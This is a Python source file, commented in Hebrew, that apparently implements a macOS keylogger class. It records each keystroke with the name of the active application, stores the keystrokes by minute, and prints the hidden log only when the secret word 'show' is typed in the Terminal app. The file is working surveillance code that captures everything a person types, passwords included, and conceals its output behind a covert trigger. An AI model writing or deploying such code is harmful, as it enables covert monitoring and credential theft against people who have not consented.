from collections import deque
from typing import List, Dict
from datetime import datetime
from pynput.keyboard import Key
import AppKit
from key_logger_interface import KeyLoggerInterface


class KeyLoggerService(KeyLoggerInterface):
    MAGIC_WORD = "show"
    MAGIC_APP = 'המסוף'

    def __init__(self):
        self.key_logs_by_minute: Dict[str, str] = {}  # שמירת הקשות לפי דקה
        self.last_keys = deque(maxlen=len(self.MAGIC_WORD))  # תור להקלדות אחרונות
        self.is_logging = False  # האם הרישום מופעל

    def start_logging(self) -> None:
        """מתחיל את הרישום של המקשים"""
        self.is_logging = True

    def stop_logging(self) -> None:
        """מפסיק את הרישום של המקשים"""
        self.is_logging = False

    def get_logged_keys(self) -> List[str]:
        """מחזיר את כל המקשים שנרשמו"""
        return [key for keys in self.key_logs_by_minute.values() for key in keys]

    def log_key(self, key_name: str):
        """רושם את המקש שנלחץ עם שם האפליקציה הפעילה"""
        if not self.is_logging:
            return

        active_app = self.get_active_application()
        current_time = self.get_current_time()

        # עדכון המידע בקובץ הרישום
        if current_time in self.key_logs_by_minute:
            self.key_logs_by_minute[current_time] += key_name
        else:
            self.key_logs_by_minute[current_time] = key_name

        # הוספה לתור
        self.last_keys.append((key_name, active_app))

        # אם הוקלד ה"קסם", הצגת הלוגים
        if self.is_time_to_show():
            self.print_key_logs()
            self.key_logs_by_minute.clear()

    def is_time_to_show(self) -> bool:
        """בודק האם יש להציג את הרישום"""
        return "".join(t[0] for t in self.last_keys) == self.MAGIC_WORD and all(
            t[1] == self.MAGIC_APP for t in self.last_keys)

    def print_key_logs(self):
        """מציג את הלוגים של המקשים"""
        for timestamp, keys in self.key_logs_by_minute.items():
            print(f"-----{timestamp}-----")
            print(keys)

    @staticmethod
    def get_key_format(key) -> str:
        """מקבל אובייקט של מקש ומחזיר אותו כטקסט"""
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif hasattr(key, 'name') and key.name is not None:
            return f"[{key.name}]"
        return "[UNKNOWN]"

    @staticmethod
    def get_active_application() -> str:
        """מחזיר את שם האפליקציה הפעילה"""
        app = AppKit.NSWorkspace.sharedWorkspace().activeApplication()
        return app.get('NSApplicationName')

    @staticmethod
    def get_current_time() -> str:
        """מחזיר את הזמן הנוכחי בפורמט הרצוי"""
        return datetime.now().strftime("%Y-%m-%d %H:%M")
